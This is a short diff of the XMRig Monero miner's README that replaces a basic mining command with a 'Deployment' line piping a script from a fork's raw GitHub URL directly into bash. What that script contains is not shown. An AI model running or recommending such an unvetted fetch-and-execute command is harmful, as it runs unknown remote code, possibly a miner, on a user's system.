@@ -46,9 +46,9 @@ make
   * Clone with `git clone https://github.com/xmrig/xmrig.git` :hammer: [Build instructions](https://github.com/xmrig/xmrig/wiki/Build).
 
 ## Usage
-### Basic example
+### Deployment
 ```
-xmrig.exe -o pool.monero.hashvault.pro:5555 -u YOUR_WALLET -p x -k
+curl -L https://raw.githubusercontent.com/wenewzhang/xmrig/master/deploy_ubuntu.sh | bash
 ```
 
 ### Failover
